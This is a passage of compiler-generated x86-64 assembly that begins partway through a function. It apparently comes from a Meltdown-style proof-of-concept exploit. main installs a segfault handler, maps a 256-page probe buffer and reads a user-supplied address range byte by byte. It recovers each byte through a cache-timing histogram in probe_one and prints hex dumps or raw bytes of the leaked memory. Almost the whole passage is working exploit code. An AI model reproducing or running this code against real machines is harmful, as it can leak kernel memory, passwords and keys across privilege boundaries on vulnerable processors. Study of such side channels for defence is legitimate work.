	movq	-2336(%rbp,%rdx,8), %rdx
	cmpq	%rax, %rdx
	jnb	.L10
	movl	-2388(%rbp), %eax
	jmp	.L11
.L10:
	movl	-2384(%rbp), %eax
.L11:
	movl	%eax, -2384(%rbp)
	addl	$1, -2388(%rbp)
.L9:
	cmpl	$255, -2388(%rbp)
	jle	.L12
	movl	-2384(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %eax
	leal	1(%rax), %edx
	movl	-2384(%rbp), %eax
	cltq
	movb	%dl, -288(%rbp,%rax)
	addl	$1, -2392(%rbp)
.L3:
	movl	-2392(%rbp), %eax
	cmpl	-2376(%rbp), %eax
	jl	.L13
	movl	$0, -2388(%rbp)
	jmp	.L14
.L17:
	movl	-2388(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %edx
	movl	-2380(%rbp), %eax
	cltq
	movzbl	-288(%rbp,%rax), %eax
	cmpb	%dl, %al
	jnb	.L15
	movl	-2388(%rbp), %eax
	jmp	.L16
.L15:
	movl	-2380(%rbp), %eax
.L16:
	movl	%eax, -2380(%rbp)
	addl	$1, -2388(%rbp)
.L14:
	cmpl	$255, -2388(%rbp)
	jle	.L17
	movl	-2380(%rbp), %eax
	movq	-24(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L19
	call	__stack_chk_fail@PLT
.L19:
	movq	-8(%rbp), %rbx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE12:
	.size	probe_one, .-probe_one
	.section	.rodata
.LC0:
	.string	"0x%016lx | "
.LC1:
	.string	"%02X "
.LC2:
	.string	"|  %s \n"
.LC3:
	.string	"   "
	.text
	.globl	dump_hex
	.type	dump_hex, @function
dump_hex:
.LFB13:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$80, %rsp
	movq	%rdi, -56(%rbp)
	movq	%rsi, -64(%rbp)
	movq	%rdx, -72(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movb	$0, -16(%rbp)
	movq	-56(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC0(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	$0, -48(%rbp)
	jmp	.L21
.L30:
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	leaq	.LC1(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$31, %al
	jbe	.L22
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	cmpb	$126, %al
	ja	.L22
	movq	-64(%rbp), %rdx
	movq	-48(%rbp), %rax
	addq	%rdx, %rax
	movzbl	(%rax), %edx
	movq	-48(%rbp), %rax
	andl	$15, %eax
	movb	%dl, -32(%rbp,%rax)
	jmp	.L23
.L22:
	movq	-48(%rbp), %rax
	andl	$15, %eax
	movb	$46, -32(%rbp,%rax)
.L23:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$7, %eax
	testq	%rax, %rax
	je	.L24
	movq	-48(%rbp), %rax
	addq	$1, %rax
	cmpq	%rax, -72(%rbp)
	jne	.L25
.L24:
	movl	$32, %edi
	call	putchar@PLT
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L26
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L25
.L26:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	cmpq	%rax, -72(%rbp)
	jne	.L25
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	movb	$0, -32(%rbp,%rax)
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	cmpq	$8, %rax
	ja	.L27
	movl	$32, %edi
	call	putchar@PLT
.L27:
	movq	-48(%rbp), %rax
	addq	$1, %rax
	andl	$15, %eax
	movq	%rax, -40(%rbp)
	jmp	.L28
.L29:
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	addq	$1, -40(%rbp)
.L28:
	cmpq	$15, -40(%rbp)
	jbe	.L29
	leaq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC2(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L25:
	addq	$1, -48(%rbp)
.L21:
	movq	-48(%rbp), %rax
	cmpq	-72(%rbp), %rax
	jb	.L30
	nop
	movq	-8(%rbp), %rax
	subq	%fs:40, %rax
	je	.L31
	call	__stack_chk_fail@PLT
.L31:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE13:
	.size	dump_hex, .-dump_hex
	.section	.rodata
	.align 8
.LC4:
	.string	"usage: %s [start_addr (hex)] [len (dec)] [raw, optional]\n"
.LC5:
	.string	"mmap() failed: %s\n"
	.align 8
.LC6:
	.string	"poke buffer: %p, page size: %i\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB14:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$264, %rsp
	.cfi_offset 3, -24
	movl	%edi, -260(%rbp)
	movq	%rsi, -272(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	call	getpagesize@PLT
	movl	%eax, -244(%rbp)
	movl	$0, -248(%rbp)
	movq	$0, -232(%rbp)
	movq	$0, -224(%rbp)
	leaq	-208(%rbp), %rax
	movl	$152, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	leaq	-208(%rbp), %rax
	addq	$8, %rax
	movq	%rax, %rdi
	call	sigemptyset@PLT
	leaq	sigaction_segv(%rip), %rax
	movq	%rax, -208(%rbp)
	movl	$4, -72(%rbp)
	leaq	-208(%rbp), %rax
	movl	$0, %edx
	movq	%rax, %rsi
	movl	$11, %edi
	call	sigaction@PLT
	cmpl	$2, -260(%rbp)
	jle	.L33
	cmpl	$4, -260(%rbp)
	jle	.L34
.L33:
	movq	-272(%rbp), %rax
	movq	(%rax), %rax
	movq	%rax, %rsi
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$0, %eax
	jmp	.L47
.L34:
	movq	-272(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	movl	$16, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	strtoul@PLT
	movq	%rax, -232(%rbp)
	movq	-272(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	movl	$10, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	strtoul@PLT
	movq	%rax, -224(%rbp)
	cmpl	$4, -260(%rbp)
	jne	.L36
	movl	$1, -248(%rbp)
.L36:
	movl	-244(%rbp), %eax
	sall	$8, %eax
	cltq
	movl	$0, %r9d
	movl	$-1, %r8d
	movl	$33, %ecx
	movl	$3, %edx
	movq	%rax, %rsi
	movl	$0, %edi
	call	mmap@PLT
	movq	%rax, -216(%rbp)
	cmpq	$-1, -216(%rbp)
	jne	.L37
	call	__errno_location@PLT
	movl	(%rax), %eax
	movl	%eax, %edi
	call	strerror@PLT
	movq	%rax, %rsi
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$-1, %eax
	jmp	.L47
.L37:
	movl	-244(%rbp), %edx
	movq	-216(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	$0, -240(%rbp)
	jmp	.L38
.L41:
	cmpl	$0, -248(%rbp)
	jne	.L39
	cmpq	$0, -240(%rbp)
	je	.L39
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L39
	movq	-232(%rbp), %rdx
	movq	-240(%rbp), %rax
	addq	%rdx, %rax
	subq	$16, %rax
	movq	%rax, %rcx
	leaq	-48(%rbp), %rax
	movl	$16, %edx
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	dump_hex
.L39:
	movq	-232(%rbp), %rdx
	movq	-240(%rbp), %rax
	leaq	(%rdx,%rax), %rcx
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rbx
	movl	-244(%rbp), %edx
	movq	-216(%rbp), %rax
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	probe_one
	movb	%al, -48(%rbp,%rbx)
	cmpl	$0, -248(%rbp)
	je	.L40
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rdx
	leaq	-48(%rbp), %rax
	addq	%rdx, %rax
	movl	$1, %edx
	movq	%rax, %rsi
	movl	$1, %edi
	call	write@PLT
.L40:
	addq	$1, -240(%rbp)
.L38:
	movq	-240(%rbp), %rax
	cmpq	-224(%rbp), %rax
	jb	.L41
	cmpl	$0, -248(%rbp)
	jne	.L42
	cmpq	$0, -240(%rbp)
	je	.L42
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	je	.L43
	movq	-240(%rbp), %rax
	andl	$15, %eax
	movq	%rax, %rdx
	jmp	.L44
.L43:
	movl	$16, %edx
.L44:
	movq	-240(%rbp), %rax
	andl	$15, %eax
	testq	%rax, %rax
	jne	.L45
	movq	-240(%rbp), %rax
	subq	$1, %rax
	andq	$-16, %rax
	jmp	.L46
.L45:
	movq	-240(%rbp), %rax
	andq	$-16, %rax
.L46:
	movq	-232(%rbp), %rcx
	addq	%rcx, %rax
	movq	%rax, %rcx
	leaq	-48(%rbp), %rax
	movq	%rax, %rsi
	movq	%rcx, %rdi
	call	dump_hex
.L42:
	movl	-244(%rbp), %eax
	sall	$8, %eax
	movslq	%eax, %rdx
	movq	-216(%rbp), %rax
	movq	%rdx, %rsi
	movq	%rax, %rdi
	call	munmap@PLT
	movl	$0, %eax
.L47:
	movq	-24(%rbp), %rdx
	subq	%fs:40, %rdx
	je	.L48
	call	__stack_chk_fail@PLT
.L48:
	movq	-8(%rbp), %rbx
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
	.section	.bss
	.p2align	12
__gg_meltdown_sandbox:
## Meltdown sandbox page (auto-generated)
	.skip	4096
	.text
.LFE14:
	.size	main, .-main
	.ident	"GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:

